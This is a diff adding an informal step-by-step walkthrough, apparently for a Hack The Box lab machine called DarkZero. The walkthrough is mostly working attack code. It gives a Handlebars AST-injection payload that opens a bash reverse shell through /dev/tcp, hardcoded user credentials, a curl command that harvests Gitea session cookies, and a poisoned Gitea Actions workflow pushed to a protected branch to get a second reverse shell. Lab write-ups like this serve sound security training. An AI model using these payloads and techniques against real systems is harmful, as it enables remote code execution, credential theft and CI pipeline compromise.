@@ -1,0 +1,318 @@
+Drakzeroreturn direct steps
+
+add this to /etc/host
+```
+10.10.10.10 dzcampaigns.htb
+172.16.20.2 gitea.darkzero.ext
+```
+make an account on /register and login at /login
+
+create one character at : http://dzcampaigns.htb/dashboard
+
+click edit on top url you see you character id example : 15,16,17....
+
+then go here : http://dzcampaigns.htb/campaign/1
+
+hit ctrl + shit + i(inspect tab )
+
+go to console paste this code
+
+note : make sure to change you character id and your tun0 ip and turn on nc 
+```
+const ast = {
+  type: "Program",
+  body: [{
+    type: "MustacheStatement",
+    path: {
+      type: "PathExpression",
+      data: false,
+      depth: 0,
+      parts: ["lookup"],
+      original: "lookup",
+      loc: null
+    },
+    params: [
+      {
+        type: "PathExpression",
+        data: false,
+        depth: 0,
+        parts: [],
+        original: "this",
+        loc: null
+      },
+      {
+        type: "NumberLiteral",
+        value: "{},{})) + process.mainModule.require('child_process').execFileSync('/bin/bash',['-c','bash -c \"bash -i >& /dev/tcp/[ip]/8000 0>&1\"']).toString() //",
+        original: 1,
+        loc: null
+      }
+    ],
+    escaped: true,
+    strip: { open: false, close: false },
+    loc: null
+  }],
+  strip: {},
+  loc: null
+};
+
+const csrf = document.querySelector('[name="_csrf"]').value;
+
+const r = await fetch("/character/17", {
+  method: "POST",
+  credentials: "same-origin",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({
+    _csrf: csrf,
+    name: "asdffd",
+    race: "afdasfas",
+    class: "asdfasf",
+    backstory: "asfasfasas",
+    campaign_message: ast
+  })
+});
+
+console.log(r.status, await r.text());
+```
+
+hit enter you get your first shell
+
+
+make sure to stablize it else futher cmds not work
+
+
+to stablize use this 
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+CTRL +Z
+stty raw -echo; fg
+export TERM=xterm
+```
+
+ww first shell
+
+now we need user since it was direct steps i am sending use this user credientials
+
+```
+josh:Rangers1
+```
+
+now on shell
+```
+ssh josh@localhost
+```
+
+enter yes then josh password
+
+and you in josh 
+```
+josh@SRV01:~$ 
+```
+
+ww josh shell
+
+
+since there is gitea running on josh now we need to setup lingolol or lollingo/proxychains what every just we need to setup tunnel to you kali i sugg lolingo
+
+after setup now go here
+
+```
+http://gitea.darkzero.ext:3000
+```
+
+we need credits to login 
+
+
+now on josh shell use this to get gieta login cookies
+
+
+```
+curl --negotiate  -c cookies.txt -u : -v http://gitea.darkzero.ext:3000/user/login?auth_with_sspi=1
+```
+
+
+you will get you cookies now copy this cookie values
+
+we need to copy 
+```
+_csrf
+websspi
+i_like_gitea
+```
+
+now open cookie editor and just replce those values and refresh and you are in to gieta user
+
+ww login hehehe
+
+
+now imp steps
+
+
+now got here : 
+```
+http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns
+```
+
+
+click on froke like froke this repo 
+
+
+now go here
+
+```
+http://gitea.darkzero.ext:3000/user/settings/applications
+```
+
+selct all read and write
+
+give any name
+click on genrate token imp
+
+you will get your token
+example
+```
+f5xxxxxxxxxxxxxxxxxxxxxxxxxxxx0
+```
+
+now go here
+
+```
+http://gitea.darkzero.ext:3000/darkzero-ext_josh/DarkZero-Campaigns
+```
+
+and on repo setting make sure to turn on actions
+
+
+now on you kali terminal
+
+```
+export GITEA_BASE='http://gitea.darkzero.ext:3000'
+export JOSH_NAME='darkzero-ext_josh'
+export FORK_NAME='DarkZero-Campaigns'
+export JOSH_PAT='PASTE_TOKEN_HERE'
+export TARGET_IP='PASTE_NEW_HTB_IP'
+```
+
+make sure to replace with your api key token and htb ip
+
+2. Clone Josh’s fork
+```
+git clone "http://${JOSH_NAME}:${JOSH_PAT}@gitea.darkzero.ext:3000/${JOSH_NAME}/${FORK_NAME}.git"
+cd DarkZero-Campaigns
+
+git config user.name 'Josh'
+git config user.email 'josh@darkzero.ext'
+git log --oneline -3
+```
+
+3. Create an older base branch
+```
+git switch -c willow HEAD~1
+git push origin willow
+```
+
+now on browser
+
+go here
+```
+http://gitea.darkzero.ext:3000/darkzero-ext_josh/DarkZero-Campaigns/compare/willow...DarkZero:main
+```
+
+click on new pull request
+
+
+now brup time
+
+make sure you brup on now
+
+click on create pull req your brup will capture that req
+
+
+now time to make changes on that req from 13-47 just replace this
+```
+------geckoformboundary3f17d3d5921989f6d3947770842d1cb4
+Content-Disposition: form-data; name="_csrf"
+
+iNXzgf8v0QPTXt7ICYX3-Ns7ZFM6MTc4NTA1NDczMDc1NjY0NzUwMA
+------geckoformboundary3f17d3d5921989f6d3947770842d1cb4
+Content-Disposition: form-data; name="title"
+
+Add main.yml
+------geckoformboundary3f17d3d5921989f6d3947770842d1cb4
+Content-Disposition: form-data; name="content"
+
+------geckoformboundary3f17d3d5921989f6d3947770842d1cb4
+Content-Disposition: form-data; name="allow_maintainer_edit"
+
+on
+------geckoformboundary3f17d3d5921989f6d3947770842d1cb4--
+```
+
+after edit click on forword and turn off intersept and disable your brup extention
+
+once its success
+this is imp 
+at boottom on current tab you see "allow edits from maintainers" (it will be on)
+
+now come back to kali
+
+on another terminl login as ssh to josh
+
+```
+ssh josh@"box ip"
+```
+
+and turn on nc at another teminal
+
+```
+rlwrap nc -lvnp 7777
+```
+
+Leave it running.
+
+
+5. Add the workflow locally
+
+Back in the clone on Kali:
+
+```
+git switch main
+mkdir -p .gitea/workflows
+
+tee .gitea/workflows/cedar.yml >/dev/null <<'YAML'
+name: Cedar
+on: [push, workflow_dispatch]
+
+jobs:
+  cedar:
+    runs-on: ubuntu
+    steps:
+      - name: Yarrow
+        run: |
+          bash -c "bash -i >& /dev/tcp/[tun0]/7777 0>&1"
+YAML
+
+git add .gitea/workflows/cedar.yml
+git commit -m 'Cedar'
+```
+
+
+
+make sure to change ip 
+
+6. Push directly to the protected upstream
+```
+git remote add upstream \
+  "http://${JOSH_NAME}:${JOSH_PAT}@gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns.git"
+
+git push upstream HEAD:main
+```
+
+ww shell
+```
+svc-runner@SRV01:~
+```
+
+note i faced here firewall issue on my side if you guys not get shel just change port to 9090 and use this cmd `git push upstream HEAD:main`
+
+now grab `user.txt` at /home
